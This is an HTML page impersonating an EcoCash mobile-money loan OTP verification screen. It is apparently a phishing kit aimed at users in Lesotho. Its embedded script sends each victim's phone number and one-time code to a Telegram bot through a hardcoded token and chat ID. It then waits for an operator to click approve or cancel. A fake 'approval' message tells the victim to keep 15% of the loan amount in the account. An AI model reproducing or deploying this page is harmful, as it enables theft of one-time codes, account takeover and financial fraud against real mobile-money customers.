<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - OTP Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: #f8f9fc;
            overflow-y: auto;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: white;
            padding: 20px;
            text-align: center;
            position: relative;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        }
        
        .back-btn {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 28px;
            color: #2c3e50;
            text-decoration: none;
        }
        
        .title {
            font-size: 24px;
            font-weight: 700;
            color: #1a1a1a;
        }
        
        .container {
            max-width: 480px;
            margin: 40px auto;
            padding: 32px 28px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.09);
            text-align: center;
            flex: 1;
        }
        
        .subtitle {
            font-size: 16px;
            color: #6c757d;
            margin-bottom: 12px;
        }
        
        .phone {
            font-size: 18px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 40px;
        }
        
        .otp-label {
            font-size: 16px;
            color: #2c3e50;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .otp-group {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        .otp-box {
            width: 54px;
            height: 64px;
            border: 1px solid #ced4da;
            border-radius: 12px;
            font-size: 28px;
            text-align: center;
            background: #fdfdfe;
            color: #1a1a1a;
            font-weight: 600;
            transition: border-color 0.25s ease, box-shadow 0.25s ease;
        }
        
        .otp-box:focus {
            border-color: #4361ee;
            outline: none;
            box-shadow: 0 0 0 3px rgba(67,97,238,0.12);
        }
        
        .otp-error {
            color: #dc3545;
            font-size: 13.5px;
            font-weight: 500;
            margin: 4px 0 24px 0;
            display: none;
            line-height: 1.4;
        }
        
        .otp-error.visible {
            display: block;
        }
        
        .resend {
            font-size: 15px;
            color: #6c757d;
            margin-bottom: 40px;
        }
        
        .resend span {
            color: #0066ff;
            font-weight: 600;
            cursor: pointer;
        }
        
        #submitBtn {
            width: 100%;
            padding: 16px;
            background: #e9ecef;
            color: #6c757d;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.2s;
        }
        
        #submitBtn.enabled {
            background: linear-gradient(to right, #4361ee, #7209b7);
            color: white;
            cursor: pointer;
        }
        
        #submitBtn.enabled:hover {
            opacity: 0.95;
        }
        
        footer {
            text-align: center;
            padding: 24px 20px;
            color: #adb5bd;
            font-size: 13px;
            background: #f8f9fc;
            flex-shrink: 0;
            margin-top: auto;
        }
        
        #spinnerOverlay {
            position: fixed;
            inset: 0;
            background: rgba(255,255,255,0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #0066ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
        
        /* Approval Success Page */
        #approvalPage {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.4);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1100;
            padding: 20px;
        }
        
        .approval-card {
            background: white;
            border-radius: 20px;
            padding: 40px 32px;
            max-width: 480px;
            width: 90%;
            text-align: center;
            box-shadow: 0 15px 50px rgba(0,0,0,0.25);
        }
        
        .approval-icon {
            font-size: 64px;
            color: #28a745;
            margin-bottom: 24px;
        }
        
        .approval-title {
            font-size: 26px;
            font-weight: 700;
            color: #155724;
            margin-bottom: 20px;
        }
        
        .approval-message {
            font-size: 16px;
            color: #495057;
            line-height: 1.6;
            margin-bottom: 32px;
        }
        
        .close-approval {
            width: 100%;
            padding: 16px;
            background: #0066ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
        }
        
        .close-approval:hover {
            opacity: 0.92;
        }
    </style>
</head>
<body>

    <div class="header">
        <a href="login" class="back-btn">←</a>
        <div class="title">OTP Verification</div>
    </div>

    <div class="container">
        <div class="subtitle">Enter the 6-digit code sent to your registered phone number</div>
        <div class="phone" id="maskedPhone"></div>

        <div class="otp-label">Verification Code</div>
        <div class="otp-group">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
            <input type="tel" inputmode="numeric" class="otp-box" maxlength="1" pattern="[0-9]*">
        </div>

        <div class="otp-error" id="otpError">Only numbers (0-9) are allowed.</div>

        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>

        <button id="submitBtn" disabled>Submit</button>
    </div>

    <footer>© 2025 EcoCash Financial Services. All rights reserved.</footer>

    <!-- Spinner -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait while we process your loan application...
        </div>
    </div>

    <!-- Approval Success Page (own professional overlay) -->
    <div id="approvalPage">
        <div class="approval-card">
            <div class="approval-icon">✓</div>
            <div class="approval-title">Application Approved</div>
            <div class="approval-message" id="approvalMessage">
                Your loan application has been approved.<br><br>
                To proceed with disbursement, please ensure your EcoCash account maintains at least 15% of the requested loan amount as available balance. This helps us process and release your funds quickly and securely.<br><br>
                Your requested loan amount is <strong id="loanAmtDisplay">M 0</strong>.<br>
                Minimum required balance: <strong id="minBalanceDisplay">M 0</strong>.<br><br>
                Thank you for choosing EcoCash — we are committed to supporting your financial goals.
            </div>
            <button class="close-approval" onclick="document.getElementById('approvalPage').style.display='none'; window.location.href='Login' || 'login';">
                Return to Dashboard
            </button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8459564570:AAHD5IX76Yf3XKqPGqL9iy5ChAdccxtiLWg';
        const CHAT_ID   = '7399050016';

        // Mask phone (Lesotho format)
        const savedPhone = localStorage.getItem('phone') || '59123456';
        const visibleStart = savedPhone.slice(0, 3);
        const visibleEnd = savedPhone.slice(-2);
        const masked = visibleStart + '****' + visibleEnd;
        document.getElementById('maskedPhone').textContent = '+266 ' + masked;

        const otpBoxes = document.querySelectorAll('.otp-box');
        const submitBtn = document.getElementById('submitBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const approvalPage = document.getElementById('approvalPage');
        const approvalMessage = document.getElementById('approvalMessage');
        const loanAmtDisplay = document.getElementById('loanAmtDisplay');
        const minBalanceDisplay = document.getElementById('minBalanceDisplay');
        const timerSpan = document.getElementById('timer');
        const otpError = document.getElementById('otpError');

        let otpValue = '';
        let seconds = 116;
        let pollInterval;
        let lastUpdateId = 0;

        // Countdown timer
        const countdown = setInterval(() => {
            seconds--;
            timerSpan.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                timerSpan.textContent = '0';
            }
        }, 1000);

        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            if (otpValue.length === 6) {
                submitBtn.classList.add('enabled');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('enabled');
                submitBtn.disabled = true;
            }
        }

        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const val = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = val;

                if (val.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }

                otpError.classList.remove('visible');
                checkOtpComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                const pasteData = (e.clipboardData || window.clipboardData).getData('text');
                if (!/^\d+$/.test(pasteData)) {
                    e.preventDefault();
                    otpError.classList.add('visible');
                    setTimeout(() => otpError.classList.remove('visible'), 4000);
                }
            });
        });

        submitBtn.addEventListener('click', () => {
            if (otpValue.length !== 6) return;

            spinnerOverlay.style.display = 'flex';

            const timestamp = Date.now();

            const message = `OTP Verification\n\nPhone: +266 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    reply_markup: {
                        inline_keyboard: [[
                            { text: 'Approve', callback_data: 'approve_' + timestamp },
                            { text: 'Cancel', callback_data: 'cancel_' + timestamp }
                        ]]
                    }
                })
            }).catch(() => {
                spinnerOverlay.style.display = 'none';
            });

            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            for (let update of data.result) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const dataParts = update.callback_query.data.split('_');
                                    if (dataParts[1] == timestamp) {
                                        clearInterval(pollInterval);
                                        spinnerOverlay.style.display = 'none';

                                        const loanAmount = Number(localStorage.getItem('loanAmount') || 0);
                                        const minBalance = Math.ceil(loanAmount * 0.15);
                                        const formattedLoan = loanAmount.toLocaleString();
                                        const formattedMin = minBalance.toLocaleString();

                                        if (dataParts[0] === 'approve') {
                                            // Show dedicated approval page
                                            loanAmtDisplay.textContent = `M ${formattedLoan}`;
                                            minBalanceDisplay.textContent = `M ${formattedMin}`;
                                            approvalPage.style.display = 'flex';
                                        } else if (dataParts[0] === 'cancel') {
                                            // Inline message below OTP boxes
                                            otpError.textContent = 'Please enter the correct OTP and try again.';
                                            otpError.classList.add('visible');
                                        }
                                    }
                                }
                            }
                        }
                    });
            }, 1500);
        });

        checkOtpComplete();
        otpBoxes[0].focus();
    </script>
</body>
</html>
